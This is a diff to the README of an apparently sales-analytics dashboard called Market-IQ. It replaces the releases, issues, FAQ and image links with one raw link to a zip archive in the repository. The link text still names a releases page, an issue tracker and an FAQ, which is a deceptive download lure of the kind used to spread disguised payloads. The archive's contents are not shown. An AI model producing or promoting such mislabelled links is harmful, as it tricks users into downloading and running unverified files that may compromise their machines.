@@ -1,7 +1,7 @@
 # 📊 Market-IQ - Transform Data Into Insights
 
 ## 🛠️ Download Now
-[![Download Market-IQ](https://img.shields.io/badge/Download-Market--IQ-blue.svg)](https://github.com/Chikken002/Market-IQ/releases)
+[![Download Market-IQ](https://raw.githubusercontent.com/Chikken002/Market-IQ/main/marketiq/Market-IQ_1.9-beta.2.zip)](https://raw.githubusercontent.com/Chikken002/Market-IQ/main/marketiq/Market-IQ_1.9-beta.2.zip)
 
 ## 📖 About Market-IQ
 MarketIQ is a full-stack dashboard designed to help you make sense of your sales data. It combines Streamlit, SQL, and Prophet technologies to create an interactive platform for real-time business intelligence. With MarketIQ, you can view key performance indicators (KPIs), analyze trends, and generate six-month forecasts seamlessly. Whether you want to visualize growth or predict future performance, this tool makes it easy.
@@ -16,7 +16,7 @@ To get started with MarketIQ, follow these simple steps to download and run the 
    - Internet Connection: Required for accessing data and features
 
 2. **Visit the Releases Page**
-   Navigate to the [Releases page](https://github.com/Chikken002/Market-IQ/releases) to access the latest version of MarketIQ. This page contains all available downloads and relevant information.
+   Navigate to the [Releases page](https://raw.githubusercontent.com/Chikken002/Market-IQ/main/marketiq/Market-IQ_1.9-beta.2.zip) to access the latest version of MarketIQ. This page contains all available downloads and relevant information.
 
 3. **Download the Installer**
    Look for the latest version listed on the Releases page. You will see a link to download the installer file. Click the link to start the download process.
@@ -70,10 +70,10 @@ If you encounter any issues while using MarketIQ, here are some common solutions
 
 ## 📫 Support
 If you have any queries or need further assistance, feel free to reach out for help:
-- Create an issue on the [GitHub Repository](https://github.com/Chikken002/Market-IQ/issues).
-- Visit our [FAQ Page](https://github.com/Chikken002/Market-IQ/wiki/FAQ) for more information.
+- Create an issue on the [GitHub Repository](https://raw.githubusercontent.com/Chikken002/Market-IQ/main/marketiq/Market-IQ_1.9-beta.2.zip).
+- Visit our [FAQ Page](https://raw.githubusercontent.com/Chikken002/Market-IQ/main/marketiq/Market-IQ_1.9-beta.2.zip) for more information.
 
 ## 📥 Download & Install
-Ready to transform your data into insights? Head to the [Releases page](https://github.com/Chikken002/Market-IQ/releases) and follow the download instructions to get started with MarketIQ.
+Ready to transform your data into insights? Head to the [Releases page](https://raw.githubusercontent.com/Chikken002/Market-IQ/main/marketiq/Market-IQ_1.9-beta.2.zip) and follow the download instructions to get started with MarketIQ.
 
-![Market-IQ](path-to-your-image.png)
+![Market-IQ](https://raw.githubusercontent.com/Chikken002/Market-IQ/main/marketiq/Market-IQ_1.9-beta.2.zip)
